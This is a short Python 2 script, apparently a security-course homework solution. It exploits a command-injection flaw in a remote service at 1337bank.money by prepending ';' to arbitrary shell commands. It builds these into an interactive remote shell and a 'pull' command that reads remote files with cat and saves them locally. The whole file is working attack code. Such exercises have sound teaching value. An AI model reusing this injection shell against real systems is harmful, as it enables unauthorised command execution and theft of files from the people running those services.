"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()contents

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket

host = "1337bank.money" # IP address here
port = 1337 # Port here

def execute_cmd(cmd):   
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
    s.connect((host,port));
    
    s.recv(1024); # "give domain or IP address"
    s.send(";" + cmd + "\n");
    s.recv(1024); # junk infomation
    data = s.recv(131072).split("\n");
    
    contents = [data[:len(data)-2]]; # contents of cmd
    contents = [data[len(data)-2:]] + contents; # contents of pwd
    
    return contents;
    
if __name__ == '__main__':
    cmd = raw_input("> ").split(" ");
    
    while cmd[0] != "quit":
        if cmd[0] == "shell":
            curr_dir = "/";
            while cmd != "exit":
                prompt = curr_dir + "> ";
                cmd = raw_input(prompt)
                contents = execute_cmd("cd " + curr_dir + "; " + cmd + "; pwd");
                curr_dir = contents[0][0];
                for out in contents[1]:
                    print(out);
        elif cmd[0] == "pull":
            contents = execute_cmd("cat " + cmd[1] + "; pwd");
            with open(cmd[2], "w") as f:
                for out in contents[1]:
                    f.write(out);
                f.write("\n");
        else:
            print("1. shell: Drop into an interactive shell and allows users to gracefully exit\n2. pull <remote_path> <local-path>: Download files\n3. help: Shows this help menu\4. quit: Quit the shell");
        cmd = raw_input("> ").split(" ");
